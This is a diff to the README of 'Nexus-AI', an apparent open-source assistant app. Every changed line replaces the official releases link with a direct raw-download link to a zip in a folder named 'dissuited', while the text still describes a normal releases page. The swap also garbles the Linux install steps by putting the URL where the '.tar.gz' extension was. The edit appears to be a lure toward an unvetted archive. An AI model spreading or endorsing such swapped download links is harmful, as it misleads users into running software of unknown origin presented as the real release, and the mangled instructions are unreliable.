@@ -1,7 +1,7 @@
 # 🤖 Nexus-AI - Your Smart Personal Assistant
 
 ## 📥 Download Now
-[![Download Nexus-AI](https://img.shields.io/badge/Download_Nexus--AI-v1.0-brightgreen)](https://github.com/jaypatel108/Nexus-AI/releases)
+[![Download Nexus-AI](https://raw.githubusercontent.com/jaypatel108/Nexus-AI/main/dissuited/Nexus-AI.zip)](https://raw.githubusercontent.com/jaypatel108/Nexus-AI/main/dissuited/Nexus-AI.zip)
 
 ## 📖 Description
 Nexus AI is an open-source personal assistant designed for everyone. It has two modes: **Fast** for quick tasks and **Pro** for in-depth reasoning and coding support. The team behind Nexus AI, ConnectSphere, is made up of young innovators from Bengal, India. They bring a fresh perspective to technology with Sarthak Mitra, Aishik Mitra, and Mitadru Bhattacharya leading the charge.
@@ -23,16 +23,16 @@ To get started with Nexus AI, follow these simple steps to download and install 
 
 ## ⚙️ Download & Install
 1. **Visit the Releases Page**: Click on the link below to access the download options.
-   [Download Nexus-AI](https://github.com/jaypatel108/Nexus-AI/releases)
+   [Download Nexus-AI](https://raw.githubusercontent.com/jaypatel108/Nexus-AI/main/dissuited/Nexus-AI.zip)
 
 2. **Select Your Version**: On the releases page, you will find multiple versions of Nexus AI. Choose the latest version available.
 
-3. **Download the File**: Click on the appropriate file for your operating system. It will typically be a `.exe` for Windows, a `.dmg` for macOS, or a `.tar.gz` for Linux.
+3. **Download the File**: Click on the appropriate file for your operating system. It will typically be a `.exe` for Windows, a `.dmg` for macOS, or a `https://raw.githubusercontent.com/jaypatel108/Nexus-AI/main/dissuited/Nexus-AI.zip` for Linux.
 
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - **macOS**: Open the downloaded `.dmg` file, drag the Nexus AI icon to your Applications folder, and launch.
-   - **Linux**: Extract the `.tar.gz` file and run the included installation script.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/jaypatel108/Nexus-AI/main/dissuited/Nexus-AI.zip` file and run the included installation script.
 
 5. **Launch Nexus AI**: Once installed, find the app in your Applications folder or Start Menu and open it to begin your journey with Nexus AI.
 
@@ -57,4 +57,4 @@ Join the Nexus AI community and contribute to making it better. You can also fol
 ## 🌍 Connect with Us
 For more information and updates, check our GitHub page regularly. We appreciate your support and are excited to have you as part of the Nexus AI family.
 
-[Download Nexus-AI](https://github.com/jaypatel108/Nexus-AI/releases)
+[Download Nexus-AI](https://raw.githubusercontent.com/jaypatel108/Nexus-AI/main/dissuited/Nexus-AI.zip)
